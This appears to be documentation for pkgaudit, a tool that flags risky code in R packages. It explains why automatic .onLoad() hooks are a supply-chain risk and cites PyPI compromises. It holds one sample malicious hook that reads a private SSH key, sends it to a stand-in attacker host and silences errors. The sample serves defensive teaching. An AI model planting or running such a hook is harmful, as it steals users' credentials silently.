# R Package Security

R is a statistical programming language widely used in environments
processing sensitive data: clinical trials, government statistics,
financial risk modeling, academic research, and more.

R packages are the primary mechanism for sharing R code. They are also
potential attack vectors. When a user calls
[`install.packages()`](https://rdrr.io/r/utils/install.packages.html), R
downloads and installs a package and its dependencies. When a user calls
[`library()`](https://rdrr.io/r/base/library.html) to load and attach a
package, R automatically executes R code contained in `.onLoad()` and
`.onAttach()` hooks. A malicious package anywhere in the dependency
graph can run code on the user’s system without any action beyond a
normal R workflow.

A minimal example of what a malicious `.onLoad()` hook might look like
is:

``` r

.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- paste(
      readLines("~/.ssh/id_rsa"),
      collapse = "\n"
    )
    httr::POST(
      "https://evil.com/evil",
      body = list(key = key)
    )
  }, error = function(e) invisible(NULL))
}
```

This code reads a private cryptographic key and sends it to a server
controlled by the attacker. This occurs whenever a package or dependency
containing this code is loaded, before any package function is called.
[`tryCatch()`](https://rdrr.io/r/base/conditions.html) suppresses any
errors, so the user sees nothing unusual even if
[`readLines()`](https://rdrr.io/r/base/readLines.html) fails because the
file does not exist or the user lacks permission to read it. pkgaudit
flags this hook as a code context and the `httr::POST()` call as a
pattern inside it.

Similar attacks have been documented in ecosystems adjacent to R. In
2022, the Python package ctx on PyPI was
[compromised](https://www.sonatype.com/blog/pypi-package-ctx-compromised-are-you-at-risk)
to exfiltrate environment variables – including credentials. Later that
year, a malicious `torchtriton` package uploaded to PyPI
[displaced](https://pytorch.org/blog/compromised-nightly-dependency/)
the legitimate dependency of PyTorch’s nightly builds and exfiltrated
`/etc/passwd`, `~/.gitconfig`, and the contents of `~/.ssh`.

R’s use in environments handling sensitive data makes it an attractive
target for a broad range of threat actors. The assets at risk include
both the data processed in R sessions and the underlying systems on
which R runs, which can provide compute resources and credentials for
lateral movement. pkgaudit provides one layer of defense against an
under-appreciated risk, flagging security-relevant files and code in R
packages for human review.
